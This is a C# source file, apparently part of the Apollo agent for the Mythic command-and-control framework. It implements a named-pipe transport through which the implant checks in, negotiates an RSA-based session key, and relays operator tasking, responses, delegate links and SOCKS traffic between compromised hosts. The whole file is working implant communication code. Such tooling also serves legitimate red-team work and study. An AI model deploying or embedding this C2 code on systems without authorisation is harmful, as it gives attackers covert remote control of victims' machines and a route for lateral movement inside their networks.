using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Interfaces;
using ApolloInterop.Classes;
using System.IO.Pipes;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Types.Delegates;
using System.Runtime.Serialization.Formatters.Binary;
using ApolloInterop.Structs.ApolloStructs;
using System.Collections.Concurrent;
using ApolloInterop.Enums.ApolloEnums;
using System.Threading;
using ST = System.Threading.Tasks;
using ApolloInterop.Serializers;
using ApolloInterop.Constants;
using ApolloInterop.Classes.Core;
using ApolloInterop.Classes.Events;

namespace NamedPipeTransport
{
    public class NamedPipeProfile : C2Profile, IC2Profile
    {
        internal struct AsyncPipeState
        {
            internal PipeStream Pipe;
            internal CancellationTokenSource Cancellation;
            internal ST.Task Task;
        }
        private static JsonSerializer _jsonSerializer = new JsonSerializer();
        private string _namedPipeName;
        private AsyncNamedPipeServer _server;
        private bool _encryptedExchangeCheck;
        private static ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private static AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private static ConcurrentQueue<IMythicMessage> _recieverQueue = new ConcurrentQueue<IMythicMessage>();
        private static AutoResetEvent _receiverEvent = new AutoResetEvent(false);
        private Dictionary<PipeStream, AsyncPipeState> _writerTasks = new Dictionary<PipeStream, AsyncPipeState>();
        private Action<object> _sendAction;
        private IAgent _agent;
        private CheckinMessage? _savedCheckin = null;
        private bool _uuidNegotiated = false;

        private ST.Task _agentConsumerTask = null;
        private ST.Task _agentProcessorTask = null;

        public NamedPipeProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
        {
            _namedPipeName = data["pipename"];
            _encryptedExchangeCheck = data["encrypted_exchange_check"] == "T";
            _agent = agent;
            _sendAction = (object p) =>
            {
                CancellationTokenSource cts = ((AsyncPipeState)p).Cancellation;
                PipeStream pipe = ((AsyncPipeState)p).Pipe;
                while (pipe.IsConnected && !cts.IsCancellationRequested)
                {
                    _senderEvent.WaitOne();
                    if (!cts.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] result))
                    {
                        pipe.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, pipe);
                    }
                }
            };
        }

        public void OnAsyncConnect(object sender, NamedPipeMessageArgs args)
        {
            // We only accept one connection at a time, sorry.
            if (_writerTasks.Count > 0)
            {
                args.Pipe.Close();
                return;
            }
            AsyncPipeState arg = new AsyncPipeState()
            {
                Pipe = args.Pipe,
                Cancellation = new CancellationTokenSource(),
            };
            ST.Task tmp = new ST.Task(_sendAction, arg);
            arg.Task = tmp;
            _writerTasks[args.Pipe] = arg;
            _writerTasks[args.Pipe].Task.Start();
            Connected = true;
        }

        public void OnAsyncDisconnect(object sender, NamedPipeMessageArgs args)
        {
            args.Pipe.Close();
            if (_writerTasks.ContainsKey(args.Pipe))
            {
                var tmp = _writerTasks[args.Pipe];
                _writerTasks.Remove(args.Pipe);
                Connected = _writerTasks.Count > 0;
            
                tmp.Cancellation.Cancel();
                _senderEvent.Set();
                _receiverEvent.Set();
            
                tmp.Task.Wait();
            }
        }

        public void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
        {
            IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(
                Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
            lock(MessageStore)
            {
                if (!MessageStore.ContainsKey(chunkedData.ID))
                {
                    MessageStore[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
                    MessageStore[chunkedData.ID].MessageComplete += DeserializeToReceiverQueue;
                }
            }
            MessageStore[chunkedData.ID].AddMessage(chunkedData);
        }

        private void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            pipe.EndWrite(result);
            // Potentially delete this since theoretically the sender Task does everything
            if (_senderQueue.TryDequeue(out byte[] data))
            {
                pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
            }
        }

        private bool AddToSenderQueue(IMythicMessage msg)
        {
            IPCChunkedData[] parts = Serializer.SerializeIPCMessage(msg, IPC.SEND_SIZE / 2);
            foreach(IPCChunkedData part in parts)
            {
                _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_jsonSerializer.Serialize(part)));
            }
            _senderEvent.Set();
            return true;
        }

        public void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for(int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            IMythicMessage msg = Serializer.DeserializeIPCMessage(data.ToArray(), mt);
            // Console.WriteLine("We got a message: {0}", mt.ToString());
            _recieverQueue.Enqueue(msg);
            _receiverEvent.Set();
        }


        public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp)
        {
            while (Agent.IsAlive())
            {
                _receiverEvent.WaitOne();
                IMythicMessage msg = _recieverQueue.FirstOrDefault(m => m.GetTypeCode() == mt);
                if (msg != null)
                {
                    _recieverQueue = new ConcurrentQueue<IMythicMessage>(_recieverQueue.Where(m => m != msg));
                    return onResp(msg);
                }
                if (!Connected)
                    break;
            }
            return true;
        }

        
        public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
        {
            if (_server == null)
            {
                _server = new AsyncNamedPipeServer(_namedPipeName, null, 1, IPC.SEND_SIZE, IPC.RECV_SIZE);
                _server.ConnectionEstablished += OnAsyncConnect;
                _server.MessageReceived += OnAsyncMessageReceived;
                _server.Disconnect += OnAsyncDisconnect;
            }

            if (_encryptedExchangeCheck && !_uuidNegotiated)
            {
                var rsa = Agent.GetApi().NewRSAKeyPair(4096);
                EKEHandshakeMessage handshake1 = new EKEHandshakeMessage()
                {
                    Action = "staging_rsa",
                    PublicKey = rsa.ExportPublicKey(),
                    SessionID = rsa.SessionId
                };
                AddToSenderQueue(handshake1);
                if (!Recv(MessageType.EKEHandshakeResponse, delegate(IMythicMessage resp)
                {
                    EKEHandshakeResponse respHandshake = (EKEHandshakeResponse)resp;
                    byte[] tmpKey = rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
                    ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
                    ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
                    return true;
                }))
                {
                    return false;
                }
            }
            AddToSenderQueue(checkinMsg);
            if (_agentProcessorTask == null || _agentProcessorTask.IsCompleted)
            {
                return Recv(MessageType.MessageResponse, delegate (IMythicMessage resp)
                {
                    MessageResponse mResp = (MessageResponse)resp;
                    if (!_uuidNegotiated)
                    {
                        _uuidNegotiated = true;
                        ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
                        checkinMsg.UUID = mResp.ID;
                        _savedCheckin = checkinMsg;
                    }
                    Connected = true;
                    return onResp(mResp);
                });
            } else
            {
                return true;
            }
        }

        public void Start()
        {
            _agentConsumerTask = new ST.Task(()=> 
            {
                while (Agent.IsAlive() && _writerTasks.Count > 0)
                {
                    if (!Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage tm)
                    {
                        if (tm.Delegates.Length != 0 || tm.Responses.Length != 0 || tm.Socks.Length != 0)
                        {
                            AddToSenderQueue(tm);
                            return true;
                        }
                        return false;
                    }))
                    {
                        Thread.Sleep(100);
                    }
                }
            });
            _agentProcessorTask = new ST.Task(() =>
            {
                while(Agent.IsAlive() && _writerTasks.Count > 0)
                {
                    Recv(MessageType.MessageResponse, delegate (IMythicMessage msg)
                    {
                        return Agent.GetTaskManager().ProcessMessageResponse((MessageResponse)msg);
                    });
                }
            });
            _agentConsumerTask.Start();
            _agentProcessorTask.Start();
            _agentProcessorTask.Wait();
            _agentConsumerTask.Wait();
        }

        public bool Send<IMythicMessage>(IMythicMessage message)
        {
            return AddToSenderQueue((ApolloInterop.Interfaces.IMythicMessage)message);
        }

        public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
        {
            throw new NotImplementedException();
        }

        public bool IsOneWay()
        {
            return true;
        }

        public bool IsConnected()
        {
            return _writerTasks.Keys.Count > 0;
        }
    }
}
